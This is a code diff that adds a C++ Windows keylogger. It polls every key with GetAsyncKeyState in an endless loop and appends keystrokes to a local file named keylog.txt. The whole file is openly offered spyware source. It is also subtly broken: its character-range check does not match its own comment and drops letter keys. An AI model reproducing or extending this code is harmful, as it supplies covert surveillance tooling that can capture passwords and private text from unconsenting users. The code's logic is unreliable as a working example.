@@ -1,0 +1,78 @@
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+// Function to log keystrokes
+void log_keystroke(int key, std::ofstream& logfile) 
+{
+    // If the key is a standard character (A-Z, 0-9, symbols)
+    if (key >= 39 && key <= 64) 
+    {
+        logfile.put(static_cast<char>(key));
+    } 
+    else 
+    {
+        // Handle special keys
+        switch (key) 
+        {
+            case VK_SPACE:
+                logfile.put(' ');
+                break;
+            
+            case VK_SHIFT:
+                logfile << "[SHIFT]";
+                break;
+
+            case VK_RETURN:
+                logfile << "\n";
+                break;
+
+            case VK_BACK:
+                logfile << "[BACKSPACE]";
+                break;
+
+            case VK_TAB:
+                logfile << "[TAB]";
+                break;
+
+            case VK_ESCAPE:
+                logfile << "[ESCAPE]";
+                break;
+
+            case VK_CONTROL:
+                logfile << "[CTRL]";
+                break;
+
+            default:
+                break;
+        }
+    }
+    logfile.flush();  // Ensure the data is immediately written to the file
+}
+
+int main() 
+{
+    std::ofstream logfile("keylog.txt", std::ios::app);  // Open or create the log file in append mode
+    if (!logfile.is_open()) 
+    {
+        std::cerr << "Error opening file!" << std::endl;
+        return 1;
+    }
+
+    // Infinite loop to capture keystrokes
+    while (true) 
+    {
+        for (int key = 8; key <= 190; key++) 
+        {
+            // If a key is pressed, log it
+            if (GetAsyncKeyState(key) == -32767) 
+            {
+                log_keystroke(key, logfile);
+            }
+        }
+        Sleep(10);  // Small delay to reduce CPU usage
+    }
+
+    logfile.close();  // Close the log file (though in this loop, it won't be reached)
+    return 0;
+}
